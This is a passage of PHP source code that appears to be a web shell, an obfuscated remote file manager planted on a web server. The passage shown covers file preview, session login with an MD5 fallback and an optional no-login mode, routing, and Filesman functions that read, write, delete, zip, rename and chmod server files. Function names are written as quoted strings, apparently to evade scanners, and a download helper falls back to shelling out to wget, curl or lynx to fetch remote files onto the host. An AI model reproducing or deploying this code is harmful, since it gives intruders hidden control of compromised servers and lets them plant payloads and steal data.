                    <a href="' . __SCRIPT__ . '?raw=' . Utils::__string_enc($filePath) . '&s' . ($isx ? '&x=' . self::__get_request('x') : '') . '" style="max-width:15rem; margin-top:10px;"><button style="width:100%;">Show String</button></a>
                    ';
                    if ($iss) {
                        $content .= htmlspecialchars($fileContent);
                    }
                } else if (in_array($ext, $GLOBALS['ER0_array']['aud_ext'])) {
                    $preview .= '
                    <audio controls loop style=" max-width:15rem;" src="' . __SCRIPT__ . '?content=' . Utils::__string_enc($filePath) . '"></audio>
                    <a href="' . __SCRIPT__ . '?raw=' . Utils::__string_enc($filePath) . '&s' . ($isx ? '&x=' . self::__get_request('x') : '') . '" style="max-width:15rem; margin-top:10px;"><button style="width:100%;">Show String</button></a>
                    ';
                    if ($iss) {
                        $content .= htmlspecialchars($fileContent);
                    }
                } else if (in_array($ext, $GLOBALS['ER0_array']['arc_ext'])) {
                    $preview .= '
                    <span class="w-full flex justify-center items-center">No Preview</span>
                    <a href="' . __SCRIPT__ . '?raw=' . Utils::__string_enc($filePath) . '&s' . ($isx ? '&x=' . self::__get_request('x') : '') . '" style="max-width:15rem; margin-top:10px;"><button style="width:100%;">Show String</button></a>
                    ';
                    if ($iss) {
                        $content .= htmlspecialchars($fileContent);
                    }
                } else {
                    $content .= htmlspecialchars($fileContent);
                }


                echo '<!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link rel="shortcut icon" href="' . $GLOBALS['ER0_source']['icon'] . '" type="image/x-icon">
                    <title>✦ ' . $GLOBALS['ER0_string']['title'] . ' ✦</title>
                    <style>
                    html {
                        background:black;
                        color:white;
                    }
                    pre {
                        white-space: pre-wrap;       /* Since CSS 2.1 */
                        white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */
                        white-space: -pre-wrap;      /* Opera 4-6 */
                        white-space: -o-pre-wrap;    /* Opera 7 */
                        word-wrap: break-word;
                    }
                    </style>
                </head>
                <body class="overflow-hidden scroll-smooth">
                <div style="display:flex; align-items:center; padding:20px 0 0 20px;">
                    <div style="display:grid;">' . $preview . '</div>
                    <div style="margin-left:20px;">
                    <p>Name : ' . $file . '</p>
                    <p>Size : ' . Filesman::__get_size($file) . '</p>
                    <p>Type : ' . Filesman::__get_filetype($file) . '</p>
                    </div>
                </div>
                <p style="color:red;">Warning! : Displaying Strings in non-text file types (archives, images, video, audio, and others) can slow down your browser and may cause crashes, so use with caution.</p>
                <div style="background:white; height:5px; width:100%; margin:10px 0 10px 0;"></div>
    ' . $err . '
                <div style="width:100%; height:72vh; overflow:auto;">
                    <pre>
    ' . $content . '
                    </pre>
                </div>
                </body>
                </html>';

                exit();
            } else {
                echo '<script>location.href=`' . __SCRIPT__ . '?down=' . Utils::__string_enc($filePath) . '`</script>';
            }
        } else if (isset(${"_GET"}['x'])) {
            echo '<script>location.href=`' . __SCRIPT__ . '`</script>';
        }
    }
}

/** CLASS SESSION ============================================================================ */

class Session
{
    public static function __session_manager($option, $value, $key1, $key2 = null, $key3 = null, $redirect = null)
    {
        if ($option == 'SET') {
            if ($key1 != null) {
                ${"_SESSION"}[__ER0_SESSION_ID__][$key1] = $value;
            } else if ($key2 != null) {
                ${"_SESSION"}[__ER0_SESSION_ID__][$key1][$key2] = $value;
            } else if ($key3 != null) {
                ${"_SESSION"}[__ER0_SESSION_ID__][$key1][$key2][$key3] = $value;
            } else {
                return false;
            }
            if($key1 != null || $key2 != null || $key3 != null){
                #LOG(__session_manager, session SET)#
            }
        } else if ($option == 'GET') {
            if ($key1 != null) {
                return ${"_SESSION"}[__ER0_SESSION_ID__][$key1];
            } else if ($key2 != null) {
                return ${"_SESSION"}[__ER0_SESSION_ID__][$key1][$key2];
            } else if ($key3 != null) {
                return ${"_SESSION"}[__ER0_SESSION_ID__][$key1][$key2][$key3];
            } else {
                return false;
            }
            if($key1 != null || $key2 != null || $key3 != null){
                #LOG(__session_manager, session GET)#
            }
        } else {
            if ($key1 != null) {
                unset(${"_SESSION"}[__ER0_SESSION_ID__][$key1]);
            } else if ($key2 != null) {
                unset(${"_SESSION"}[__ER0_SESSION_ID__][$key1][$key2]);
            } else if ($key3 != null) {
                unset(${"_SESSION"}[__ER0_SESSION_ID__][$key1][$key2][$key3]);
            } else {
                return false;
            }
            if($key1 != null || $key2 != null || $key3 != null){
                #LOG(__session_manager, session UNSET)#
            }
        }

        if (!empty($redirect)) {
            echo "<script>window.location.href='" . $redirect . "';</script>";
        }

        return true;
    }

    public static function __password_verify($user, $pass)
    {
        $type = 'hash';
        if(AUTH){
            if (Utils::__function_exist('password_verify', 'raw')) {
                if (isset($user, $pass) && isset($GLOBALS['ER0_user'][$user]) && password_verify($pass, $GLOBALS['ER0_user'][$user]['hash'])) {
                    self::__session_manager('SET', $user, 'usr');
                    self::__session_manager('SET', $pass, 'psw', 'hash');
                }
            } else {
                // Use the MD5 password
                if (isset($user, $pass) && isset($GLOBALS['ER0_user'][$user]) && md5($pass) == $GLOBALS['ER0_user'][$user]['md5']) {
                    self::__session_manager('SET', $user, 'usr');
                    self::__session_manager('SET', $pass, 'psw', 'md5');
                }
                $type = 'md5';
            }
        } else {
            self::__session_manager('SET', 'nologin', 'usr');
        }

        return $type;
    }

    public static function __check_session()
    {
        if(!AUTH){
            return true;
        }

        $user = self::__session_manager('GET', null, 'usr');
        $hash = self::__session_manager('GET', null, 'psw', 'hash');
        $md5 = self::__session_manager('GET', null, 'psw', 'md5');

        if (!empty($user) && isset($GLOBALS['ER0_user'][$user])) {

            if (!empty($hash) && password_verify($hash, $GLOBALS['ER0_user'][$user]['hash'])) {
                return true;
            } elseif (!empty($md5) && md5($md5) == $GLOBALS['ER0_user'][$user]['md5']) {
                return true;
            }
        }
        return false;
    }

    public static function __save_cookie($data, $cookieName = 'ER0_conf', $stringEnc = true)
    {
        $IMUNYPASS_CONF_SAVE = $data;
        $COOKIE = ($stringEnc ? Utils::__string_enc($cookieName, true) : $cookieName);
        if (setcookie($COOKIE, serialize($IMUNYPASS_CONF_SAVE), time() + (86400 * 30), "/")) {
            #LOG(__save_cookie, cookie saved)#
            return true;
        }
        return false;
    }
}
class Routes
{
    public static function __gets($action, $dir, $tools, $file, $dirname, $opt)
    {
        $available_tool = $GLOBALS['ER0_array']['tools_title'];
        $tool_icon = $GLOBALS['ER0_array']['tools_icon'];

        $dir = !empty($dir) ? $dir : null;
        $name = !empty($file) ? $file : $dirname;
        $content = '';

        if ($action == 'menu') {
            $count = 0;
            foreach ($available_tool as $tool) {
                if ($tools == strtolower($tool)) {
                    $content .= Frontend::__create_menu(str_replace('_', ' ', $tool), Utils::__string_enc(strtolower($tool)), Utils::__string_enc($dir), $tool_icon[$count], true);
                } else {
                    $content .= Frontend::__create_menu(str_replace('_', ' ', $tool), Utils::__string_enc(strtolower($tool)), Utils::__string_enc($dir), $tool_icon[$count], false);
                }
                $count++;
            }
        } else if ($action == 'tools') {
            $count = 0;
            foreach ($available_tool as $tool) {
                if ($tools == strtolower($tool)) {
                    $content .= '<span class="flex items-center mb-4 justify-center gap-2"><a href="#action=' . $GLOBALS['ER0_string']['filesman'] . '&dir=' . Utils::__string_enc($dir) . '" class="text-2xl cursor-pointer font-medium inline-flex items-center text-foreground hover:text-primary"><i class="bx bx-left-arrow-alt"></i></a><i class="' . $tool_icon[$count] . '"></i>' . str_replace('_', ' ', $tool) . '</span>';
                }
                $count++;
            }

            $content .= loaded_routes_controls($action, $dir, $tools, $file, $dirname, $opt);

        } else if ($action == 'filesman') {

            // $content = "Dir: $dir File: $file Dirname: $dirname Option: $opt";
            $name = !empty($file) ? $file : $dirname;
            $content .= '<span class="flex mb-4 items-center justify-center gap-2"><a href="#action=' . $GLOBALS['ER0_string']['filesman'] . '&dir=' . Utils::__string_enc($dir) . '" class="text-2xl cursor-pointer font-medium inline-flex items-center text-foreground hover:text-primary"><i class="bx bx-left-arrow-alt"></i></a>' . ucwords($opt) . ' : <span class="font-bold text-themecolor-300 ml-2 truncate w-[60vw] sm:w-auto">' . $name . '</span></span>';

            switch ($opt) {
                case 'open':
                case 'zip':
                case 'extract':
                case 'edit':
                case 'rename':
                case 'copy':
                case 'move':
                case 'chmod':
                case 'time':
                case 'delete':
                    $content .= FileManager::__file_manager($dir, $name, null, $opt);
                    break;
                case 'link':
                    $content = '';
                    // $url = Tools_domain::get_fileurl($GLOBALS['ER0_array']['domains'], realpath($name), $GLOBALS['ER0_array']['public_folder']);
                    $content .= 'DONT_SHOW_TOOLS';
                    // $content .= "<script>window.open(`$url`, `_blank`);</script>";
                    break;
                case 'raw':
                    $content = '';
                    $content .= 'DONT_SHOW_TOOLS';
                    $content .= '<script>window.open("' . __SCRIPT__ . '?raw=' . Utils::__string_enc($dir . __DIRECTORY_SEPARATOR__ . $name) . '", "_blank");</script>';
                    break;
                case 'download':
                    $content = '';
                    $content .= 'DONT_SHOW_TOOLS';
                    $content .= '<script>window.open("' . __SCRIPT__ . '?down=' . Utils::__string_enc($dir . __DIRECTORY_SEPARATOR__ . $name) . '", "_blank");</script>';
                    break;


                default:
                    $content = '';
                    $content .= "DONT_SHOW_TOOLS";
                    break;
            }
        } else {
            $content .= loaded_custom_action_controls($action, $dir, $tools, $file, $dirname, $opt);
        }

        return $content;
    }

    public static function __updates($action, $dir, $tools, $opt, $name, $value)
    {

        if ($action == 'tools') {
            $content = '';

            $content .= loaded_routes_proccess($action, $dir, $tools, $opt, $name, $value);

            return $content;
        } else if ($action == 'filesman') {

            $opt = 'save_' . $opt;
            $content = '';

            $content = FileManager::__file_manager($dir, $name, $value, $opt);
            return $content;
        }
    }

    public static function __bulk($dir, $action, $value, $count)
    {
        $content = '';
        $action = 'bulk_' . $action;
        $content .= '<span class="flex items-center mb-4 justify-center gap-2"><a onclick="$(`#tools_container`).removeClass(`overflow-auto`); $(`#tools_container`).addClass(`hidden`); $(`#filemanager`).removeClass(`hidden`);" class="text-2xl cursor-pointer font-medium inline-flex items-center text-foreground hover:text-primary"><i class="bx bx-left-arrow-alt"></i></a>' . ucwords(str_replace('_', ' ', $action)) . '</span>';
        $content .= FileManager::__file_manager($dir, "Multiple Items ($count)", $value, $action);
        return $content;
    }

    public static function __bulk_save($dir, $action, $source, $value)
    {
        $content = '';
        $action = 'bulksv_' . $action;

        $content = FileManager::__file_manager($dir, $source, $value, $action);
        return $content;
    }
}
class Filesman
{
    /**
     * Save string into file
     * @param string $filename
     * @param string $content
     */
    public static function __save_file($filename, $content)
    {
        $w = @fopen($filename, "wb") or @"function_exists"('file_put_contents');
        $status = true;
        if ($w) {
            $status = @fwrite($w, $content) or @fputs($w, $content) or @"file_put_contents"($filename, $content);
            @fclose($w);
        }
        return $status;
    }

    /**
     * Read file and output into string
     * @param string $filename
     */
    public static function __read_file($filename)
    {
        $w = @fopen($filename, "rb") or @"function_exists"('file_get_contents');
        $output = '';
        if ($w) {
            if ($fh = @fopen($filename, "rb")) {
                while (!feof($fh)) {
                    $output .= fread($fh, 8192);
                }
            } else {
                $$output .= "file_get_contents"($filename);
            }
        }
        return $output;
    }

    /**
     * Download file from url
     * @param string $url
     * @param string $saveas
     */
    public static function __save_from_url($url, $saveas)
    {
        if (!preg_match("/[a-z]+:\/\/.+/", $url)) return false;
        $filename = basename($url);

        if ($content = self::__read_file($url)) {
            if (is_file($saveas)) unlink($saveas);
            if (self::__save_file($saveas, $content)) {
                return true;
            }
        } else {
            if (Terminal::__check_execute()) {
                $buff = Terminal::__execute("wget " . $url . " -O " . $saveas);
                if (is_file($saveas)) return true;

                $buff = Terminal::__execute("curl " . $url . " -o " . $saveas);
                if (is_file($saveas)) return true;

                $buff = Terminal::__execute("lwp-download " . $url . " " . $saveas);
                if (is_file($saveas)) return true;

                $buff = Terminal::__execute("lynx -source " . $url . " > " . $saveas);
                if (is_file($saveas)) return true;
            }
        }

        return false;
    }

    /**
     * Convert bytes into formated size
     * @param string $bytes int bytes | file
     * @param bool $format if true format bytes (raw)
     */
    public static function __get_size($bytes, $format = false)
    {
        $size = $format ? $bytes : "filesize"($bytes);
        $units = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
        $power = ($size > 0) ? floor(log($size, 1024)) : 0;
        $power = ($power > (count($units) - 1)) ? (count($units) - 1) : $power;
        return sprintf('%s %s', round($size / pow(1024, $power), 2), $units[$power]);
    }

    /**
     * Get size of directory
     * @param string $directory
     */
    public static function __get_dir_size($directory)
    {
        $bytes = 0;
        $directory = realpath($directory);
        if ($directory !== false && $directory != '' && file_exists($directory)) {
            foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, FilesystemIterator::SKIP_DOTS)) as $file) {
                $bytes += $file->getSize();
            }
        }
        return $bytes;
    }

    /**
     * Get last modified of file/folder
     * @param string $file
     */
    public static function __get_lastmodified($file)
    {
        if ($GLOBALS['ER0_config']['show_lastmodtime']) {
            return "<span style='font-size:12px;'>" . date("d/m/Y H:i:s", "filemtime"($file)) . "</span>";
        } else {
            return "<span style='font-size:12px;'>" . date("d/m/Y", "filemtime"($file)) . "</span>";
        }
    }

    /**
     * Get permission of file/folder
     * @param string $file
     * @param string $output
     * num return only octal | chr return only formated | random/null return formated + octal perms
     */
    public static function __get_permission($file, $output, $disclr = 'themecolor-700', $autohideoctal = true, $center = false)
    {
        if ($perms = @"fileperms"($file)) {
            $flag = '-';
            $flagTypes = [0xC000 => 's', 0xA000 => 'l', 0x8000 => '-', 0x6000 => 'b', 0x4000 => 'd', 0x2000 => 'c', 0x1000 => 'p',];
            foreach ($flagTypes as $mask => $type) {
                if (($perms & $mask) == $mask) {
                    $flag = $type == '-' ? '<span class="text-' . $disclr . '">' . $type . '</span>' : $type;
                    break;
                }
            }
            $permissions = [00400 => 'r', 00200 => 'w', 00100 => 'x', 00040 => 'r', 00020 => 'w', 00010 => 'x', 00004 => 'r', 00002 => 'w', 00001 => 'x',];
            foreach ($permissions as $mask => $permission) {
                $flag .= ($perms & $mask) ? $permission : '<span class="text-' . $disclr . '">' . $permission . '</span>';
            }
            $octal_perms = substr(sprintf('%o', $perms), -4);
            $other_accessible = ($perms & 00007) ? true : false;
            $color = $other_accessible ? 'text-themecolor-green' : 'text-themecolor-red';
            if ($output === 'num') {
                return $octal_perms;
            } else {
                return "<span class='$color " . ($center ? "items-center justify-center" : "") . " flex'>$flag" . ($output == 'chr' ? "" : $output . "<span class='ml-1 " . ($autohideoctal ? 'hidden sm:' : '') . "inline-block'>($octal_perms)</span>") . "</span>";
            }
        } else {
            substr(sprintf('%o', "fileperms"($file)), -4);
        }
    }

    /**
     * Get file Owner & Group
     * @param string $file
     * @return string owner/group
     */
    public static function __get_file_ownergroup($file)
    {

        $downer = Utils::__function_exist("posix_getpwuid", 'raw') ? @"posix_getpwuid"("fileowner"($file))['name'] : "fileowner"($file);
        $dgrp = Utils::__function_exist("posix_getgrgid", 'raw') ? @"posix_getgrgid"("filegroup"($file))['name'] : "filegroup"($file);
        return $downer . '/' . $dgrp;
    }

    /**
     * Get filetype of given file
     * @param string $file
     * @return mixed filetype
     */
    public static function __get_filetype($file)
    {
        $gtyp = ("function_exists"('mime_content_type')) ? "mime_content_type"($file) : "filetype"($file);
        return (!empty($gtyp) ? $gtyp : 'unknown');
    }

    /**
     * Get server disk space
     * @return array [total, free, usedPercentage]
     */
    public static function __get_diskspace()
    {
        $totalSpace = disk_total_space("/");
        $freeSpace = disk_free_space("/");
        $usedSpace = $totalSpace - $freeSpace;
        $usedPercentage = ($usedSpace / $totalSpace) * 100;

        return [
            'total' => self::__get_size($totalSpace, true),
            'free' => self::__get_size($freeSpace, true),
            'usedPercentage' => round($usedPercentage)
        ];
    }

    /**
     * Get windows partition drives
     * (work only in windows system)
     */
    public static function __get_windrive()
    {

        $drives = "";
        if ($GLOBALS['ER0_string']['sys'] == 'win') {
            foreach (range('a', 'z') as $drive) {
                if (@"is_dir"(Utils::__construct_path($drive . ':'))) {
                    $drives .= "<a href='#action=" . $GLOBALS['ER0_string']['filesman'] . "&dir=" . Utils::__string_enc(Utils::__construct_path($drive . ':')) . "' class='text-primary hover:brightness-75 cursor-pointer'> [ " . strtoupper($drive) . " ] </a> ";
                }
            }
        } else {
            $drives = '<span class="text-themecolor-red">Can\'t Find Drives</span>';
        }
        return $drives;
    }

    /**
     * To Download file from server
     * @param string $fileLocation
     * @param string $fileName
     * @param int $chunkSize default = 1024
     */
    public static function __download_file($fileLocation, $fileName, $chunkSize  = 1024)
    {
        if (connection_status() != 0)
            return (false);

        $contentType = self::__get_filetype($fileName);

        if (is_array($contentType)) {
            $contentType = implode(' ', $contentType);
        }

        $size = filesize($fileLocation);

        if ($size == 0) {
            return (false);
        }

        @ini_set('magic_quotes_runtime', 0);
        $fp = Filesman::__read_file($fileName);

        if ($fp === false) {
            return (false);
        }

        // headers
        header('Content-Description: File Transfer');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header("Content-Transfer-Encoding: binary");
        header("Content-Type: $contentType");

        $contentDisposition = 'attachment';

        if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")) {
            $fileName = preg_replace('/\./', '%2e', $fileName, substr_count($fileName, '.') - 1);
            header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
        } else {
            header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
        }

        header("Accept-Ranges: bytes");
        $range = 0;

        if (isset($_SERVER['HTTP_RANGE'])) {
            list($a, $range) = explode("=", $_SERVER['HTTP_RANGE']);
            str_replace($range, "-", $range);
            $size2 = $size - 1;
            $new_length = $size - $range;
            header("HTTP/1.1 206 Partial Content");
            header("Content-Length: $new_length");
            header("Content-Range: bytes $range$size2/$size");
        } else {
            $size2 = $size - 1;
            header("Content-Range: bytes 0-$size2/$size");
            header("Content-Length: " . $size);
        }
        while (ob_get_level()) ob_end_clean();
        readfile($fileName);

        return ((connection_status() == 0) and !connection_aborted());
    }

    /**
     * Create ZIP
     * @param string $file
     * @param string $value
     */
    public static function __zip($file, $value, $opt = null)
    {

        if (str_contains($opt, 'bulksv')) {
            $files_c = 0;
            $folder_c = 0;
            $array = json_decode(Utils::__charcode_dec($file), true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                $status = 'failed';
                $detail = "Error when decoding array!";
            } else {
                if (!"file_exists"($value)) {
                    $result = Zipper::__create_zip($file, $value, 'bulk');
                    if (empty($result['errors'])) {
                        $folder_c += $result['folders'];
                        $files_c += $result['files'];

                        $status = 'success';
                        $detail = 'Success added ' . $files_c . ' file and ' . $folder_c . ' folder into zip in path ' . $value;
                    } else {
                        $status = 'failed';
                        $detail = 'Errors: ' . implode(', ', $result['errors']);
                    }
                } else {
                    $status = 'failed';
                    $detail = 'Failed zip destination exists!';
                }
            }
        } else {
            if ("file_exists"($file)) {
                if (!"file_exists"($value)) {
                    $result = Zipper::__create_zip($file, $value);
                    if (empty($result['errors'])) {
                        $status = 'success';
                        $detail = 'Success added ' . $result['files'] . ' file and ' . $result['folders'] . ' folder into zip in path ' . $value;
                    } else {
                        $status = 'failed';
                        $detail = 'Errors: ' . implode(', ', $result['errors']);
                    }
                } else {
                    $status = 'failed';
                    $detail = 'Failed zip destination exists!';
                }
            } else {
                $status = 'failed';
                $detail = 'Folder not founds!';
            }
        }

        return json_encode(['status' => $status, 'detail' => $detail]);
    }

    /**
     * Extract archive
     * @param string $file
     * @param string $value
     */
    public static function __extract($file, $value)
    {

        if ("file_exists"($file)) {
            if (!"file_exists"($value)) {
                $result = Zipper::__extract_archive($file, $value);
                if (empty($result['errors'])) {
                    $status = 'success';
                    $detail = 'Success extract ' . $result['files'] . ' file and ' . $result['folders'] . ' folder in path ' . $value;
                } else {
                    $status = 'failed';
                    $detail = 'Errors: ' . implode(', ', $result['errors']);
                }
            } else {
                $status = 'failed';
                $detail = 'Failed folder destination exists!';
            }
        } else {
            $status = 'failed';
            $detail = 'File not founds!';
        }

        return json_encode(['status' => $status, 'detail' => $detail]);
    }

    /**
     * Edit file
     * @param string $file
     * @param string $value
     */
    public static function __edit($file, $value)
    {
        if ("file_exists"($file)) {
            $write = fopen($file, 'w');
            $new_text = "stripslashes"($value);
            if (fwrite($write, $new_text)) {
                $status = 'success';
                $detail = 'Save file success!';
            } else {
                $status = 'failed';
                $detail = 'Failed to save file!';
            }
            fclose($write);
        } else {
            $status = 'failed';
            $detail = 'File not exists!';
        }

        return json_encode(['status' => $status, 'detail' => $detail]);
    }

    /**
     * Rename
     * @param string $file
     * @param string $value
     */
    public static function __rename($file, $value, $opt = null)
    {
        if (str_contains($opt, 'bulksv')) {
            $files_c = 0;
            $folder_c = 0;
            $file_err = 0;
            $folder_err = 0;
            $counter = 1;
            $array = json_decode(Utils::__charcode_dec($file), true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                $status = 'failed';
                $detail = "Error when decoding array!";
            } else {
                $counter = 1;
                $files_c = 0;
                $folder_c = 0;
                $file_err = 0;
                $folder_err = 0;

                $filenames = [];

                foreach ($array as $d1) {
                    $files = Utils::__string_dec($d1['file']);
                    $type = ($d1['item'] == 'dir') ? 'DIR' : 'FILE';
                    $ext = ($d1['item'] == 'file') ? '.' . pathinfo($files, PATHINFO_EXTENSION) : '';
                    $name = basename($files, $ext);
                    $double_prefix = [];
                    $value_ = $value;

                    // Extract the existing counter from the name if present
                    if (preg_match('/^(\d+)_/', $name, $matches)) {
                        $existing_counter = $matches[1];
                        $name = substr($name, strlen($existing_counter) + 1); // Remove the existing counter and underscore
                    } else {
                        $existing_counter = '';
                    }

                    // Check if prefix is using placeholders
                    $is_placeholder_format = preg_match('/\{([^}]+)\}/', $value_);
                    $add_default_ext = true;
                    $force_rename = false;
                    if (preg_match('/^F\[(.*)\]$/', $value_, $force_match)) {
                        $value_ = $force_match[1];
                        $force_rename = true;
                    }
                    $delete_counter = false;
                    if ($is_placeholder_format) {
                        // Parse the prefix format
                        $prefix_format = $value_;

                        if (preg_match_all('/\{[^}]*\}/', $prefix_format, $matchesx)) {
                            foreach ($matchesx[0] as $match) {
                                $modified_match = preg_replace_callback(
                                    '/([A-Z]{2}\([^)]*\))|(\s+)/',
                                    function ($m) {
                                        return isset($m[1]) ? $m[1] : '';
                                    },
                                    $match
                                );

                                $prefix_format = str_replace($match, $modified_match, $prefix_format);
                            }
                        }

                        $prefix_parts = [];
                        if (preg_match_all('/\{([^}]+)\}/', $prefix_format, $matches_)) {
                            foreach ($matches_[1] as $part) {
                                $prefix_parts[] = $part;
                            }
                        }

                        // Apply transformations to each part
                        $transformations = [];
                        foreach ($prefix_parts as $part) {
                            if (preg_match('/([A-Z]{2}+)\(([^)]+)\)/', $part, $match)) {
                                $transformation = $match[1]; // captures 'UPPERCASE'
                                $part = explode(",", $match[2]); // captures '...something...' from UPPERCASE(...)
                                $part = array_reverse($part);

                                $transformations[] = ['main_prefix' => $part[0], 'part_prefix' => $transformation, 'part_prefix_value' => ($part[1] == null ? null : $part[1])];
                            } else if (preg_match('/([A-Z]+)\(([^)]+)\)/', $part, $match)) {
                                $transformation = $match[1];
                                $part = $match[2];

                                $transformations[] = ['main_prefix' => $part, 'part_prefix' => $transformation, 'part_prefix_value' => ''];
                            } else {

                                $transformations[] = ['main_prefix' => $part, 'part_prefix' => '', 'part_prefix_value' => ''];
                            }
                        }

                        // Replace placeholders with actual values
                        $prefix = $prefix_format;
                        $valid_prefix = true;
                        foreach ($transformations as $prefixs) {
                            $main_prefix = $prefixs['main_prefix'];
                            $part_prefix = $prefixs['part_prefix'];
                            $part_prefix_value = $prefixs['part_prefix_value'];
                            $construct_prefix_format = (empty($part_prefix) && empty($part_prefix_value) ? '{' . $main_prefix . '}' : (empty($part_prefix_value) ? '{' . $part_prefix . '(' . $main_prefix . ')}' : '{' . $part_prefix . '(' . $part_prefix_value . ',' . $main_prefix . ')}'));

                            switch ($main_prefix) {
                                case 'name':
                                    $value_ = $name;
                                    break;
                                case 'ext':
                                    $value_ = $ext;
                                    $add_default_ext = false; // User has provided the extension
                                    break;
                                case 'type':
                                    $value_ = $type;
                                    break;

                                case 'counter':
                                    $value_ = str_pad($counter, 2, '0', STR_PAD_LEFT);
                                    break;

                                default:
                                    $valid_prefix = false;
                                    $status = 'failed';
                                    $detail = "Rename Prefix Invalid!";
                                    return json_encode(['status' => $status, 'detail' => $detail]);
                            }

                            // Apply transformation to the value
                            if ($valid_prefix) {
                                switch ($part_prefix) {
                                    case 'U':
                                        $value_ = strtoupper($value_);
                                        break;
                                    case 'L':
                                        $value_ = strtolower($value_);
                                        break;
                                    case 'S':
                                        $value_ = str_shuffle($value_);
                                        break;
                                    case 'C':
                                        $value_ = preg_replace_callback(
                                            '/[a-zA-Z]/',
                                            function ($matches) {
                                                return rand(0, 1) ? strtoupper($matches[0]) : strtolower($matches[0]);
                                            },
                                            $value_
                                        );
                                        break;
                                    case 'D':
                                        $value_ = '';
                                        if ($part == 'counter') {
                                            $delete_counter = true;
                                        }
                                        $add_default_ext = false; // User has explicitly deleted the extension
                                        break;
                                    case 'WD':
                                        if ($part_prefix_value != null) {
                                            $value_ = str_replace($part_prefix_value, '', $value_);
                                            break;
                                        } else {
                                            $status = 'failed';
                                            $detail = "Modifiers Prefix Value Invalid!";
                                            return json_encode(['status' => $status, 'detail' => $detail]);
                                        }
                                    case 'WR':
                                        if ($part_prefix_value != null) {
                                            $str = explode(">", $part_prefix_value);
                                            $value_ = str_replace($str[0], $str[1], $value_);
                                            break;
                                        } else {
                                            $status = 'failed';
                                            $detail = "Modifiers Prefix Value Invalid!";
                                            return json_encode(['status' => $status, 'detail' => $detail]);
                                        }
                                    case '':
                                        // No transformation, keep value as is
                                        break;
                                    default:
                                        $status = 'failed';
                                        $detail = "Modifiers Prefix Invalid!";
                                        return json_encode(['status' => $status, 'detail' => $detail]);
                                }

                                // Replace the part in the prefix
                                $value_ = trim($value_);
                                $prefix_format = str_replace($construct_prefix_format, $value_, $prefix_format);
                            } else {
                                $status = 'failed';
                                $detail = "Rename Prefix Invalid!";
                                return json_encode(['status' => $status, 'detail' => $detail]);
                            }
                        }

                        if ($add_default_ext && $d1['item'] == 'file') {
                            $prefix_format .= $ext;
                        }

                        $new_name = rtrim($prefix_format, ".");
                    } else {
                        // Plaintext prefix
                        $prefix = $value_;
                        if (count($array) > 1) {
                            $prefix = str_pad($counter, 2, '0', STR_PAD_LEFT) . '_' . $prefix;
                        }
                        if ($d1['item'] == 'file' && strpos($prefix, '{ext}') === false) {
                            $prefix .= $ext;
                        }
                        $new_name = $prefix;
                    }

                    // Check for duplicate filenames if counter is deleted
                    if ($delete_counter && !$force_rename) {
                        if (in_array($new_name, $filenames)) {
                            $status = 'failed';
                            $detail = "Invalid rename! resulting filenames would be identical!";
                            return json_encode(['status' => $status, 'detail' => $detail]);
                        }
                    }

                    $filenames[] = $new_name;

                    // Rename the file
                    if ("rename"($files, $new_name)) {
                        if ($d1['item'] == 'dir') {
                            $folder_c++;
                        } else {
                            $files_c++;
                        }
                    } else {
                        if ($d1['item'] == 'dir') {
                            $folder_err++;
                        } else {
                            $file_err++;
                        }
                    }

                    $counter++;
                }

                $status = 'success';
                $detail = '<br>Success: ' . $files_c . ' file and ' . $folder_c . ' folder<br>
        Failed: ' . $file_err  . ' file and ' . $folder_err . ' folder';
            }
        } else {
            if ("file_exists"($file)) {
                if (!empty($value)) {
                    if ("rename"($file, $value)) {
                        $status = 'success';
                        $detail = 'Rename ' . (is_file($file) ? 'file' : 'folder') . ' success!';
                    } else {
                        $status = 'failed';
                        $detail = 'Failed to rename ' . (is_file($file) ? 'file' : 'folder') . '!';
                    }
                } else {
                    $status = 'failed';
                    $detail = 'Can\'t rename with empty name';
                }
            } else {
                $status = 'failed';
                $detail = "File/Folder not exists!";
            }
        }

        return json_encode(['status' => $status, 'detail' => $detail]);
    }

    /**
     * Move or Copy
     * @param string $file
     * @param string $value
     * @param string $opt
     */
    public static function __move_copy($file, $value, $opt)
    {
        if (str_contains($opt, 'bulksv')) {
            $str = str_contains($opt, 'copy') ? true : false;
            $files_c = 0;
            $folder_c = 0;
            $file_err = 0;
            $folder_err = 0;
            $array = json_decode(Utils::__charcode_dec($file), true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                $status = 'failed';
                $detail = "Error when decoding array!";
            } else {
                if ($str) {
                    foreach ($array as $d1) {
                        $files = Utils::__string_dec($d1['file']);
                        $status_ = self::__rcopy($files, $value . __DIRECTORY_SEPARATOR__ . $files);
                        if ($status_['file_error'] > 0 || $status_['folder_error'] > 0) {
                            if ($d1['item'] == 'dir') {
                                $folder_err += $status_['folder_error'];
                                $folder_c += $status_['folder'];
                            } else {
                                $file_err += $status_['file_error'];
                                $files_c += $status_['file'];
                            }
                        } else {
                            if ($d1['item'] == 'dir') {
                                $folder_c += $status_['folder'];
                            } else {
                                $files_c += $status_['file'];
                            }
                        }
                    }
                    $status = 'success';
                    $detail = '<br>Success: ' . $files_c . ' file and ' . $folder_c . ' folder<br>
                    Failed: ' . $file_err  . ' file and ' . $folder_err . ' folder';
                } else {
                    foreach ($array as $d1) {
                        $files = Utils::__string_dec($d1['file']);
                        if ("rename"($files, $value . __DIRECTORY_SEPARATOR__ . $files)) {
                            if ($d1['item'] == 'dir') {
                                $folder_c++;
                            } else {
                                $files_c++;
                            }
                        } else {
                            if ($d1['item'] == 'dir') {
                                $folder_err++;
                            } else {
                                $file_err++;
                            }
                        }
                    }

                    $status = 'success';
                    $detail = '<br>Success: ' . $files_c . ' file and ' . $folder_c . ' folder<br>
                    Failed: ' . $file_err  . ' file and ' . $folder_err . ' folder';
                }
            }
        } else {
            $str = strpos($opt, 'copy') ? true : false;
            if ("file_exists"($file)) {
